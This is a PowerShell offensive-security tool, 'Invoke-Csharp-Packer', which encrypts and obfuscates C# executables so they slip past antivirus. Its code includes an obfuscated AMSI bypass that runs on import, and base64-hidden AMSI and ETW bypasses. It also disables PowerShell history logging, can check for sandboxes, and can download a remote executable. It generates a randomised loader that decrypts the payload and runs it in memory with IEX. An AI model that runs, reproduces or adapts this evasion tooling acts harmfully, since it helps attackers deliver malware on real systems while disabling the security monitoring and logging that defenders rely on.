# ========================================================================================================================
# 'Invoke-Csharp-Packer' allows to pack and encrypt offensive (C#) .NET executable files in order to bypass AV solutions
# Author: https://github.com/Jean-Francois-C / GNU General Public License v3.0
# ========================================================================================================================
# Features:
# - AES encryption and GZip/Deflate compression (based on 'Xencrypt')
# - AMSI bypass
# - Blocking Event Tracing for Windows (ETW)
# - Disabling PowerShell history logging
# - Basic sandbox evasion techniques (optional -sandbox)
# ========================================================================================================================
# Usage: 
# > Import-Module ./Invoke-Csharp-Packer.ps1
# > Invoke-Csharp-Packer -FileUrl https://URL/Csharp-binary.exe -OutFile C:\path\Packed-Csharp-binary.ps1
# > Invoke-Csharp-Packer -FilePath C:\path\Csharp-binary.exe -OutFile C:\path\Packed-Csharp-binary.ps1
# ========================================================================================================================

Write-Output "
   ___    _                     ___         _           
  / __|__| |_  ___ _ _ _ __ ___| _ \___  __| |_____ _ _ 
 | (__(_-< ' \/ _ | '_| '_ \___|  _/ _ |/ _| / / -_) '_|
  \___/__/_||_\__,|_| | .__/   |_| \__,_\__|_\_\___|_|  
                      |_|                               v1.0

Usage: 
> Invoke-Csharp-Packer -FileUrl https://URL/Csharp-binary.exe -OutFile C:\path\Packed-Csharp-binary.ps1
> Invoke-Csharp-Packer -FilePath C:\path\Csharp-binary.exe -OutFile C:\path\Packed-Csharp-binary.ps1

Features:
[*] AES encryption and GZip/Deflate compression (based on 'Xencrypt')
[*] AMSI bypass
[*] Blocking Event Tracing for Windows (ETW)
[*] Disabling PowerShell history logging
[*] Basic sandbox evasion techniques (optional -sandbox)
"

# ''A'''M''S''I''-''B''Y''P''A''S''S''
[Runtime.InteropServices.Marshal]::WriteInt32([Ref].ASSeMBly.GEtTYPe(("{5}{2}{0}{1}{3}{6}{4}" -f 'ut',('o'+'ma'+'t'+''+'ion.'),'.A',('Am'+''+'s'+'iU'+'t'+''),'ls',('S'+'yste'+'m.'+'M'+'anag'+'e'+'men'+'t'),'i')).GEtFieLd(("{2}{0}{1}" -f 'i',('Co'+'n'+'text'),('am'+'s')),[Reflection.BindingFlags]("{4}{2}{3}{0}{1}" -f('b'+'lic,Sta'+'ti'),'c','P','u',('N'+'on'))).GEtVaLUe($null),0x41414141);

function Invoke-Csharp-Packer {
	
		[CmdletBinding()]
		Param (
        [Parameter(ValueFromPipeline,ValueFromPipelineByPropertyName)]
        [string] $Filepath,
		 
		[Parameter(ValueFromPipeline,ValueFromPipelineByPropertyName)]
        [string] $Fileurl,
		
        [Parameter(Mandatory,ValueFromPipeline,ValueFromPipelineByPropertyName)]
        [string] $Outfile = $(Throw("-OutFile is required")),
		
		[Parameter(ValueFromPipeline,ValueFromPipelineByPropertyName)]
        [switch] $Sandbox
		)

    Process {

        $TempNETAssemblyLoaderFile = "C:\Windows\Temp\templatefile.ps1"
        $NETAssemblyLoaderFilePart1 = ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String("RnVuY3Rpb24gSW52b2tlLVBhY2tlZC1ORVQtRXhlY3V0YWJsZSB7CltDbWRsZXRCaW5kaW5nKCldClBhcmFtICgKW1BhcmFtZXRlcihWYWx1ZUZyb21QaXBlbGluZSxWYWx1ZUZyb21QaXBlbGluZUJ5UHJvcGVydHlOYW1lKV0KW1N0cmluZ1tdXSRBcmd1bWVudHMgPSAiIgopCiRBc3NlbWJseV9kYXRhQjY0ID0gIg==")))		
		$NETAssemblyLoaderFilePart2 = ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String("Ig==")))
        $NETAssemblyLoaderFilePart3 = ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String("JGZvdW5kTWFpbiA9ICRmYWxzZQokRGVjb2RlZF9ORVRhc3NlbWJseSA9IFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoJEFzc2VtYmx5X2RhdGFCNjQpCQoKdHJ5IHsKCSRORVRhc3NlbWJseSA9IFtSZWZsZWN0aW9uLkFzc2VtYmx5XTo6TG9hZCgkRGVjb2RlZF9ORVRhc3NlbWJseSkKCX0KY2F0Y2ggewoJV3JpdGUtT3V0cHV0ICJbIV0gQ291bGQgbm90IGxvYWQgYXNzZW1ibHkuIElzIGl0IGluIENPRkYvTVNJTC8uTkVUIGZvcm1hdD8iCgl0aHJvdwoJfQoJZm9yZWFjaCgkdHlwZSBpbiAkTkVUYXNzZW1ibHkuR2V0RXhwb3J0ZWRUeXBlcygpKSB7CgkJZm9yZWFjaCgkbWV0aG9kIGluICR0eXBlLkdldE1ldGhvZHMoKSkgewoJCQlpZigkbWV0aG9kLk5hbWUgLWVxICJNYWluIikgewoJCQkJJGZvdW5kTWFpbiA9ICR0cnVlCgkJCQlpZigkQXJndW1lbnRzWzBdIC1lcSAiIikgewoJCQkJCVdyaXRlLU91dHB1dCAiWypdIEF0dGVtcHRpbmcgdG8gbG9hZCB0aGUgQyMgYXNzZW1ibHkgd2l0aG91dCBhcmd1bWVudCIKCQkJCX0KCQkJCWVsc2UgewoJCQkJCVdyaXRlLU91dHB1dCAiWypdIEF0dGVtcHRpbmcgdG8gbG9hZCB0aGUgQyMgYXNzZW1ibHkgd2l0aCBhcmd1bWVudChzKTogJGFyZ3VtZW50cyIKCQkJCX0KCQkJCSRhID0gKCxbU3RyaW5nW11dQCgkQXJndW1lbnRzKSkKCQkJCQoJCQkJJHByZXZDb25PdXQgPSBbQ29uc29sZV06Ok91dAoJCQkJJHN3ID0gW0lPLlN0cmluZ1dyaXRlcl06Ok5ldygpCgkJCQlbQ29uc29sZV06OlNldE91dCgkc3cpCgkJCQkKCQkJCXRyeSB7CgkJCQkJJG1ldGhvZC5JbnZva2UoJG51bGwsICRhKQoJCQkJfQoJCQkJY2F0Y2ggewoJCQkJCVdyaXRlLU91dHB1dCAiWyFdIENvdWxkIG5vdCBpbnZva2UgdGhlIEMjIGFzc2VtYmx5IG9yIGl0IGNyYXNoZWQgZHVyaW5nIGV4ZWN1dGlvbiIKCQkJCQl0aHJvdwoJCQkJfQoJCQkJCgkJCQlbQ29uc29sZV06OlNldE91dCgkUHJldkNvbk91dCkKCQkJCSRvdXRwdXQgPSAkc3cuVG9TdHJpbmcoKQoJCQkJJG91dHB1dAoJCQl9CgkJfQoJfQoJaWYoISRmb3VuZE1haW4pIHsKCQlXcml0ZS1PdXRwdXQgIlshXSBDb3VsZCBub3QgZmluZCBwdWJsaWMgTWFpbigpIGZ1bmN0aW9uLiBEb2VzIHRoZSBuYW1lc3BhY2UgaXMgc2V0IGFzIHB1YmxpYz8iCgkJdGhyb3cKCX0KfQ==")))

        if ($Filepath) {
		Write-Output "[*] Loading the .NET executable file: '$($Filepath)"
		$Assembly_dataB64 = ([Convert]::ToBase64String([IO.File]::ReadAllBytes($Filepath)))
		Write-Output "[*] Creating the .NET executable loader script"
		[System.IO.File]::WriteAllText($TempNETAssemblyLoaderFile, $NETAssemblyLoaderFilePart1);
		[System.IO.File]::AppendAllText($TempNETAssemblyLoaderFile, $Assembly_dataB64);
		[System.IO.File]::AppendAllText($TempNETAssemblyLoaderFile, $NETAssemblyLoaderFilePart2 + "`r`n");
		[System.IO.File]::AppendAllText($TempNETAssemblyLoaderFile, $NETAssemblyLoaderFilePart3);		
		}
		elseif ($Fileurl){
		Write-Output "[*] Downloading the remote .NET executable file: '$($Fileurl)'"
		$NETassemblyfile = ([net.webclient]::new()).downloaddata($Fileurl)
		$Assembly_dataB64 = [Convert]::ToBase64String($NETassemblyfile)
		Write-Output "[*] Creating the .NET executable loader script"
		[System.IO.File]::WriteAllText($TempNETAssemblyLoaderFile, $NETAssemblyLoaderFilePart1);
		[System.IO.File]::AppendAllText($TempNETAssemblyLoaderFile, $Assembly_dataB64);
		[System.IO.File]::AppendAllText($TempNETAssemblyLoaderFile, $NETAssemblyLoaderFilePart2 + "`r`n");
		[System.IO.File]::AppendAllText($TempNETAssemblyLoaderFile, $NETAssemblyLoaderFilePart3);	
		}
		
        $paddingmodes = 'PKCS7','ISO10126','ANSIX923','Zeros'
        $paddingmode = $paddingmodes | Get-Random
        $ciphermodes = 'ECB','CBC'
        $ciphermode = $ciphermodes | Get-Random

        $keysizes = 128,192,256
        $keysize = $keysizes | Get-Random

        $compressiontypes = 'Gzip','Deflate'
        $compressiontype = $compressiontypes | Get-Random

        Write-Output "[*] File compression (GZip/Deflate)"
		$TempNETAssemblyLoaderFileRead = [System.IO.File]::ReadAllBytes($TempNETAssemblyLoaderFile)
		Del "C:\Windows\Temp\templatefile.ps1"
        [System.IO.MemoryStream] $output = New-Object System.IO.MemoryStream
        if ($compressiontype -eq "Gzip") {
            $compressionStream = New-Object System.IO.Compression.GzipStream $output, ([IO.Compression.CompressionMode]::Compress)
        } 
		elseif ( $compressiontype -eq "Deflate") {
            $compressionStream = New-Object System.IO.Compression.DeflateStream $output, ([IO.Compression.CompressionMode]::Compress)
        }
      	$compressionStream.Write( $TempNETAssemblyLoaderFileRead, 0, $TempNETAssemblyLoaderFileRead.Length )
        $compressionStream.Close()
        $output.Close()
        $compressedBytes = $output.ToArray()

        $aesManaged = New-Object "System.Security.Cryptography.AesManaged"
        if ($ciphermode -eq 'CBC') {
            $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
        } 
		elseif ($ciphermode -eq 'ECB') {
            $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::ECB
        }
        if ($paddingmode -eq 'PKCS7') {
            $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
        } 
		elseif ($paddingmode -eq 'ISO10126') {
            $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::ISO10126
        } 
		elseif ($paddingmode -eq 'ANSIX923') {
            $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::ANSIX923
        } 
		elseif ($paddingmode -eq 'Zeros') {
            $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
        }

        $aesManaged.BlockSize = 128
        $aesManaged.KeySize = 256
        $aesManaged.GenerateKey()
        $b64key = [System.Convert]::ToBase64String($aesManaged.Key)

        Write-Output "[*] File encryption (AES)"
        $encryptor = $aesManaged.CreateEncryptor()
        $encryptedData = $encryptor.TransformFinalBlock($compressedBytes, 0, $compressedBytes.Length);
        [byte[]] $fullData = $aesManaged.IV + $encryptedData
        $aesManaged.Dispose()
        $b64encrypted = [System.Convert]::ToBase64String($fullData)
        
		$AssemblyLoaderFileFile = ''
        
		if ($sandbox) {	
        Write-Output "[*] Adding basic sandbox checks"
        $code_fixed_order1 += '${17} = "aWYgKFQnZSdzJ3QnLVBBdEggVmFyJ2knYSdiJ2xlOlBTJ0QnZSdiJ3VnQ09OdGVYdCkge"' + "`r`n"
		$AssemblyLoaderFileFile += $code_fixed_order1 -join ''
		$code_fixed_order2 += '${18} = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String(${17}+"2V4aXR9IGVsc2Uge1MndCdhJ1JULVNsRSdFcCAtcyA2MH07"))' + "`r`n"
        $AssemblyLoaderFileFile += $code_fixed_order2 -join ''
        $code_fixed_order3 += 'iex(${18})' + "`r`n"
        $AssemblyLoaderFileFile += $code_fixed_order3 -join ''
        }
		
        Write-Output "[*] Adding 'A'M'S'I' bypass"
        $code_fixed_order4 += '${9} = "JGJ5cCA9IFtSZWZdLkFzc2VtYmx5LkdldFR5cGVzKCk7Rm9yRWFjaCgkYmEgaW4gJGJ5cCkge2lmICgkYmEuTmFtZSAtbGlrZSAiKml1dGlscyIpIHskY2EgPSAkYmF9fTskZGEgPSAkY2EuR2V0RmllbG"' + "`r`n"
        $AssemblyLoaderFileFile += $code_fixed_order4 -join ''
        $code_fixed_order5 += '${10} = "RzKCdOb25QdWJsaWMsU3RhdGljJyk7Rm9yRWFjaCgkZWEgaW4gJGRhKSB7aWYgKCRlYS5OYW1lIC1saWtlICIqaXRGYWlsZWQiKSB7JGZhID0gJGVhfX07JGZhLlNldFZhbHVlKCRudWxsLCR0cnVlKTsK"' + "`r`n"
        $AssemblyLoaderFileFile += $code_fixed_order5 -join ''
		$code_fixed_order6 += '${11} = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String(${9}+${10}))' + "`r`n"
        $AssemblyLoaderFileFile += $code_fixed_order6 -join ''
        $code_fixed_order7 += 'iex(${11})' + "`r`n"
        $AssemblyLoaderFileFile += $code_fixed_order7 -join ''
        
        Write-Output "[*] Adding 'E'T'W' bypass" 
		$code_fixed_order8 += '${12} = "R5cGUoJ1N5c3RlbS5NYW5hJysnZ2VtZW50LkF1dG8nKydtYXRpb24uVHJhY2luZy5QU0V0Jysnd0xvZ1ByJysnb3ZpZGVyJykuR0V0RmllTEQoJ2V0Jysnd1Byb3YnKydpZGVyJywnTm9uUCcrJ3VibGljLFN0YXRpYycpLkdlVFZhTHVlKCRudWxsKSwwKQ=="' + "`r`n"
        $AssemblyLoaderFileFile += $code_fixed_order8 -join ''
        $code_fixed_order9 += '${13} = "W1JlZmxlQ3RpT04uQXNzRU1ibHldOjpMT0FkV2l0aFBBUnRpYWxOYU1lKCdTeXN0ZW0uQ29yZScpLkdlVFRZUGUoJ1N5c3QnKydlbS5EaWFnbicrJ29zdGljcy5FdmUnKydudGluZy5FdmVuJysndFByb3ZpZGVyJykuR2V0RmllbGQoJ21fZW5hYmxlZCcsJ05vblB1YmxpYyxJbnN0YW5jZScpLlNldFZhbHVlKFtSZWZdLkFzU0VtYkxZLkdldF"' + "`r`n"
        $AssemblyLoaderFileFile += $code_fixed_order9 -join ''
        $code_fixed_order10 += '${14} = ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String(${13}+${12})))' + "`r`n"
        $AssemblyLoaderFileFile += $code_fixed_order10 -join ''
        $code_fixed_order11 += 'iex(${14})' + "`r`n"
        $AssemblyLoaderFileFile += $code_fixed_order11 -join ''
        
        Write-Output "[*] Disabling PoSh history logging"
        $code_fixed_order12 += '${15} = "U2V0LVBTUmVBZExJbmVPcFRpb24g"' + "`r`n"
        $AssemblyLoaderFileFile += $code_fixed_order12 -join ''
        $code_fixed_order13 += '${16} = ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String(${15}+"LUhpc3RvcnlTYXZlU3R5bGUgU2F2J2VOJ290aCdpbidn")))' + "`r`n"
        $AssemblyLoaderFileFile += $code_fixed_order13 -join ''
        $code_fixed_order14 += 'iex(${16})' + "`r`n"
        $AssemblyLoaderFileFile += $code_fixed_order14 -join ''
        
        $Code_alternatives  = @()
        $Code_alternatives += '${2} = [System.Convert]::FromBase64String("{0}")' + "`r`n"
        $Code_alternatives += '${3} = [System.Convert]::FromBase64String("{1}")' + "`r`n"
        $Code_alternatives += '${4} = New-Object "System.Security.Cryptography.AesManaged"' + "`r`n"
        $Code_alternatives_shuffled = $Code_alternatives | Sort-Object {Get-Random}
        $AssemblyLoaderFileFile += $Code_alternatives_shuffled -join ''
        
        $Code_alternatives  = @()
        $Code_alternatives += '${4}.Mode = [System.Security.Cryptography.CipherMode]::'+$ciphermode + "`r`n"
        $Code_alternatives += '${4}.Padding = [System.Security.Cryptography.PaddingMode]::'+$paddingmode + "`r`n"
        $Code_alternatives += '${4}.BlockSize = 128' + "`r`n"
        $Code_alternatives += '${4}.KeySize = '+$keysize + "`n" + '${4}.Key = ${3}' + "`r`n"
        $Code_alternatives += '${4}.IV = ${2}[0..15]' + "`r`n"
        $Code_alternatives_shuffled = $Code_alternatives | Sort-Object {Get-Random}
        $AssemblyLoaderFileFile += $Code_alternatives_shuffled -join ''

        $Code_alternatives  = @()
        $Code_alternatives += '${6} = New-Object System.IO.MemoryStream(,${4}.CreateDecryptor().TransformFinalBlock(${2},16,${2}.Length-16))' + "`r`n"
        $Code_alternatives += '${7} = New-Object System.IO.MemoryStream' + "`r`n"
        $Code_alternatives_shuffled = $Code_alternatives | Sort-Object {Get-Random}
        $AssemblyLoaderFileFile += $Code_alternatives_shuffled -join ''

        if ($compressiontype -eq "Gzip") {
            $AssemblyLoaderFileFile += '${5} = New-Object System.IO.Compression.GzipStream ${6}, ([IO.Compression.CompressionMode]::Decompress)'    + "`r`n"
        } 
		elseif ( $compressiontype -eq "Deflate") {
            $AssemblyLoaderFileFile += '${5} = New-Object System.IO.Compression.DeflateStream ${6}, ([IO.Compression.CompressionMode]::Decompress)' + "`r`n"
        }
        $AssemblyLoaderFileFile += '${5}.CopyTo(${7})' + "`r`n"

        $Code_alternatives  = @()
        $Code_alternatives += '${5}.Close()' + "`r`n"
        $Code_alternatives += '${4}.Dispose()' + "`r`n"
        $Code_alternatives += '${6}.Close()' + "`r`n"
        $Code_alternatives += '${8} = [System.Text.Encoding]::UTF8.GetString(${7}.ToArray())' + "`r`n"
        $Code_alternatives_shuffled = $Code_alternatives | Sort-Object {Get-Random}
        $AssemblyLoaderFileFile += $Code_alternatives_shuffled -join ''

        $AssemblyLoaderFileFile += ('Invoke-Expression','IEX' | Get-Random)+'(${8})' + "`r`n"
        
        $code = $AssemblyLoaderFileFile -f $b64encrypted, $b64key, (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var)
        $TempNETAssemblyLoaderFileRead = [System.Text.Encoding]::UTF8.GetBytes($Code)
        
        Write-Output "[*] The obfuscated & encrypted .NET executable loader script has been saved: '$($Outfile)' ..."
        [System.IO.File]::WriteAllText($Outfile,$Code)
        Write-Output "[+] Done!"
	}
}

function Create-Random-Var() {
        $set = "abcdefghijkmnopqrstuvwxyzABCDEFGHIJKLMNOP0123456789"
        (1..(4 + (Get-Random -Maximum 8)) | %{ $set[(Get-Random -Minimum 1 -Maximum $set.Length)] } ) -join ''
}
